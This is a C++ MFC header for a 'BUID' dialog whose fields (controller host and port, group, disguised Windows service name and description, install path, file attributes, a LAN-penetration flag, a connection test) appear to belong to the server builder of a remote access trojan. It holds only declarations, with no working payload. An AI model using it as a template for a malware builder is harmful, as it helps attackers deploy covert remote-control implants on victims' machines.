#pragma once

// BUID.h : header file
//

/////////////////////////////////////////////////////////////////////////////
// BUID dialog

class BUID : public CDialog
{
	// Construction
public:
	BUID(CWnd* pParent = NULL);   // standard constructor
	static	DWORD WINAPI	TestMaster(LPVOID lparam);
	// Dialog Data
		//{{AFX_DATA(BUID)
	enum { IDD = IDD_BUID };
	CString	m_Host;
	CString	m_Port;
	CString	m_Group;
	CString	m_Version;
	BOOL	m_green;
	BOOL	m_green1;
	BOOL	m_green2;

	CString	m_ServiceName;
	CString	m_ServiceDisplayName;
	CString	m_ServiceDescription;

	CString	m_svcname;//CEdit
	CString	m_scname;//CEdit
	CString	m_shelp;//CEdit

	CComboBox	m_releasepath;
	CString	m_dllname;
	CComboBox	m_filealeixing;

	CComboBox	m_fileattribute;
	BOOL	m_lanpenetrate;
	CString m_houzuiming;
	CString	m_exemeux;
	BOOL	m_kbcheck;
	CString	m_edit_kb;
	CButton	m_testBtn1;

	DWORD	m_azzds;
	BOOL	m_delrtd;
	BOOL	m_fvm;
	BOOL	m_zkfsms;
	BOOL	m_fhb;
	BOOL	m_zraz;
	BOOL	m_zjz;
	BOOL    m_fscc;
	// NOTE: the ClassWizard will add data members here
//}}AFX_DATA


// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(BUID)
protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	HICON m_hIcon;

	// Generated message map functions
	//{{AFX_MSG(BUID)
	virtual void OnOK();
	afx_msg void OnGreen();
	afx_msg void OnGreen2();
	afx_msg void OnGreen3();
	afx_msg void OnRandom2();
	afx_msg void OnBtnPath();
	afx_msg void OnKbCheck();
	afx_msg void OnKbTest();
	afx_msg void OnTestMaster1();
	//}}AFX_MSG
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	//	virtual void OnOK();
	afx_msg void OnBmp();
	DECLARE_MESSAGE_MAP()
public:
	afx_msg void OnBnClickedOk();
};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.
